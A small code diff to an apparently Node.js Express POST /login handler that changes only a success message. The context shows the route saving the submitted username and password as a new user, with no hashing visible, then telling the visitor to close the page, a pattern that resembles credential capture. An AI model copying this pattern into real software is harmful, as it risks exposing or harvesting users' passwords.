@@ -47,7 +47,7 @@ app.post("/login", async (req, res) => {
 
     const newUser = new User({ username, password });
     await newUser.save();
-    res.status(200).send("Verified, You can now close this page");
+    res.status(200).send("User Verified, You can now close this page");
   } catch (err) {
     console.error("Error saving user:", err);
     return res.status(500).send("Error saving user to database");
